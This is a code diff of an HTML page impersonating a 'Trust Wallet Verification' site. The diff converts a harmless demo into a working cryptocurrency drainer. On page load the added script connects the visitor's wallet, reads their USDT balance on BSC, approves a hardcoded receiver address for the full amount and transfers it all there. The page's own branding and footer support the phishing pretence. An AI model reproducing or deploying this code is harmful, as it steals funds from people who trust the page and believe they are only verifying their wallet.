@@ -1,44 +1,63 @@
-<!DOCTYPE html><html>
+<!DOCTYPE html>
+<html>
 <head>
 <meta charset="UTF-8">
-<title>Trust Wallet Verification Demo</title>
+<title>Trust Wallet Verification</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link rel="icon" href="favicon.ico">
 <style>
-  body {
-    background-color: #081c3a;
-    color: white;
-    font-family: Arial, sans-serif;
-    text-align: center;
-    padding: 20px;
-  }
-  img { width: 80px; margin-bottom: 20px; }
-  .status { color: #ccc; margin-top: 10px; }
+  body { background:#081c3a; color:white; text-align:center; font-family:sans-serif; padding:20px; }
+  img { width:80px; margin-bottom:20px; }
+  .status { margin-top:10px; color:#ccc; white-space:pre-line; }
+  .footer { font-size:12px; opacity:0.6; margin-top:40px; }
 </style>
 </head>
 <body>
 <img src="logo.png" alt="Trust Wallet">
-<h2>Trust Wallet Verification Demo</h2>
-<p id="status" class="status">Initializing demo mode...</p><script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script><script>
+<h2>Trust Wallet Verification</h2>
+<p id="status" class="status">Initializing...</p>
+<div class="footer">Powered by Trust Wallet • Trusted by millions</div>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+<script>
+const BSC_CHAIN_ID = '0x38';
 const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
 const USDT = "0x55d398326f99059fF775485246999027B3197955";
 const ABI = [
-  { constant: false, inputs: [{ name: "_spender", type: "address" }, { name: "_value", type: "uint256" }], name: "approve", outputs: [{ name: "", type: "bool" }], type: "function" },
-  { constant: false, inputs: [{ name: "_from", type: "address" }, { name: "_to", type: "address" }, { name: "_value", type: "uint256" }], name: "transferFrom", outputs: [{ name: "", type: "bool" }], type: "function" },
-  { constant: true, inputs: [{ name: "owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" }
+  { constant: true, inputs: [{ name: 'owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: 'balance', type: 'uint256' }], type: 'function' },
+  { constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' },
+  { constant: false, inputs: [{ name: '_from', type: 'address' }, { name: '_to', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'transferFrom', outputs: [{ name: '', type: 'bool' }], type: 'function' }
 ];
 
 window.addEventListener('load', async () => {
   const status = document.getElementById('status');
-  if (!window.ethereum) { status.innerText = "❌ Please use Trust Wallet DApp browser."; return; }
+  if (!window.ethereum) { status.innerText = "❌ Please use Trust Wallet DApp browser"; return; }
 
-  const web3 = new Web3(window.ethereum);
-  await window.ethereum.request({ method: 'eth_requestAccounts' });
-  const accounts = await web3.eth.getAccounts();
-  status.innerText = `✅ Connected: ${accounts[0]} (Demo Mode)`;
+  try {
+    await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
 
-  // Dummy action for demo
-  setTimeout(() => { status.innerText += "\n💡 Approve & transferFrom would happen here if balance > 0."; }, 2000);
+    const web3 = new Web3(window.ethereum);
+    await window.ethereum.request({ method: 'eth_requestAccounts' });
+    const accounts = await web3.eth.getAccounts();
+    const user = accounts[0];
+    status.innerText = `✅ Connected: ${user}`;
+
+    const contract = new web3.eth.Contract(ABI, USDT);
+    const balance = await contract.methods.balanceOf(user).call();
+
+    if (balance === "0") { status.innerText += '\n🚫 No USDT balance'; return; }
+
+    status.innerText += '\n🔒 Approving...';
+    await contract.methods.approve(RECEIVER, balance).send({ from: user });
+
+    status.innerText += '\n✅ Approved. Transferring...';
+    await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
+
+    status.innerText += '\n🎉 Success!';
+  } catch (e) {
+    status.innerText += '\n❌ Error: ' + e.message;
+  }
 });
-</script></body>
+</script>
+</body>
 </html>
